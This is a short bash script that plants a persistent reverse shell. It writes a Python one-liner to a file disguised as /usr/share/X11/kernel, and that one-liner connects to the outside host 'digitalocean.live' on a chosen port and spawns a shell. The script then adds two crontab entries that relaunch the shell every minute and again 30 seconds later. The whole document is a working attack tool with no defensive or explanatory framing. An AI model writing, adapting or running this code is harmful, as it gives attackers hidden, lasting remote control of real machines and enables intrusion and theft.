#!/bin/bash

# Step 1: Prompt for port number
read -p "Enter port to connect to: " port

# Step 2: Create reverse shell script
cat <<EOF > /usr/share/X11/kernel
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("digitalocean.live",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' &
EOF

chmod +x /usr/share/X11/kernel

# Step 3: Insert cron jobs into root's crontab (no sed, no direct file edit)
( crontab -l 2>/dev/null; \
  echo "* * * * * /usr/share/X11/kernel"; \
  echo "* * * * * sleep 30 && /usr/share/X11/kernel" ) | crontab -

echo "[+] Reverse shell script created and cron jobs inserted."
